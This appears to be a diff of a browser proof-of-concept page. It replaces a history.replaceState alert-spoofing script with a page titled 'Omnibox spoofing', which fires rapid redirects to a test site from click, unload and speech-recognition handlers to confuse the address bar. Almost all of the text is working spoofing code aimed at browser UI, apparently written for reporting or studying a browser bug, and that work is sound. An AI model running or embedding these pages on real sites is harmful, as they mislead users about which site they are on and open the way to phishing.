@@ -1,9 +1,27 @@
-<script>
-a="aaaaaaaaaaaaaaaa";
-for (i = 0; i < 19; i++) { 
-a += a;
-}
-history.replaceState("example", "example", a);
-alert("This alert will be shown as 'From this page', while still rendering the page the link was clicked from");
-</script>
-The attack page goes here
+
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<input id="foo" type="button" value="Click here" onclick="setInterval(function(){document.location='https://mixed.badssl.com'}, 1)">
+	<title>Omnibox spoofing</title>
+	<script>
+		var x = document.getElementById('foo');
+		window.onbeforeunload = function() {
+			setInterval(function() {
+				document.location='https://mixed.badssl.com'
+var recognition = new webkitSpeechRecognition();
+		recognition.onstart = function(){document.location='https://mixed.badssl.com'}		
+  recognition.start();
+			}, 0);
+		}
+	</script>
+</head>
+
+<body>
+	<center>
+		<br>
+	</center>
+</body>
+
+</html>
